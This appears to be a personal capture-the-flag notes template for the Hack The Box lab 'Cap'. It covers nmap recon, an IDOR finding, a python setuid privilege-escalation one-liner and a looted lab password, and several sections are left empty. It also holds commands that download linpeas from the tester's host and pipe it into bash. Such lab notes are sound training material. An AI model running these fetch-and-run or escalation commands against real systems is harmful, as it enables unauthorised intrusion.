---
box: Cap
platform: HTB
os: Linux
difficulty: easy
ip:
date_started: 22/5/2026
date_rooted: 23/5/2026
time_taken: 4 hours
status: done
tags:
  -
---

# {{Cap}}

## Summary
_One-sentence: web IDOR, direct ssh, python cap_id = 0


Tried so far
nmap shown 3 tcp ports: ftp, ssh and the html page, ftp port has a DoS CVE but doesnt help with PE, ssh no password; ftp no pw. 



## Recon

### Nmap
```
nmap -T4 -F $IP
nmap -Pn -p- --min-rate 1000 -T4 $IP -oN allports.txt
nmap -sC -sV -p<open ports> -oA detailed_scan $IP
nmap -sU -F $IP // if got stuck
```

## Enumeration
_Per-service findings. Web dirs, SMB shares, versions, default creds tried._

Ports found: FTP, SSH, Web 

**FTP**
`anonymous:` failed, pw required

**Web**
*IDOR and pcap*




## Foothold
_How you got the initial shell. Exploit used, payload, command run._

```
# command
```

**Key insight:** 

## Privilege Escalation
_What user → what user. Tool used (linpeas/winpeas/etc), vector found, exploit._

**LinEnum**
```bash
# On host
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 8000

# In target
curl $ip:8000/linpeas.sh | bash 
# Better for report
wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/linpeas_results.txt
```

**But instead of running enum scripts, check manually by:** 

Found vuln, exploit 
```
# command
python3 

import os; 
os.setuid(0);
os.system('sh')
```

**Key insight:** 

## Loot
- PASS:Buck3tH4TF0RM3!

## Lessons
_5 minutes. What did you learn? What would you do faster next time? What did you NOT know going in?_

1. Some Linux Hacks
```bash
During LinPeas, open another SSH window to poke around,
in fact, poke around during scan, dun waste time
```
2. The Enum techniques,  adaptive DFS: 
```bash
List all of the pages to explore, go one by one, stop when felt like its a rabbit hole and note down if all other didnt work out, come back to exploit with this method (fuzz)
```
3. Be familiar where my tools are, LinPea.sh, and be familar with the commands:
```bash
// to use an exploit on the server
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 8000

// then on the target
curl http://YOUR_IP:8000/linpeas.sh | bash
mv ~/Downloads .
```
4. To find something:
```bash
sudo updatedb
locate linpeas.sh
```
## Links to techniques
_Link to `Techniques/` notes for anything reusable._

**Web Application**

| Thing Seen        | Likely Meaning          | Pentest Thoughts                  |
| ----------------- | ----------------------- | --------------------------------- |
| *Gunicorn*          | *Python backend*          | *SSTI? Flask debug? Django issues?* |
| PHP/8.x           | PHP app                 | LFI, upload bypass, old CVEs      |
| Apache            | Traditional Linux stack | .htaccess, misconfigs             |
| Nginx             | Reverse proxy           | Alias traversal, proxy mistakes   |
| Node.js / Express | JavaScript backend      | Prototype pollution, JWT mistakes |
| Tomcat            | Java app                | WAR upload, manager panel         |
| IIS               | Windows/.NET            | ASPX shells, NTLM                 |
| WordPress         | CMS                     | Plugin exploits                   |
| Jenkins           | CI/CD                   | Script console RCE                |
| phpMyAdmin        | DB admin                | Weak creds                        |



## References
_Writeups, IppSec video, exploit-db links._

- IppSec video
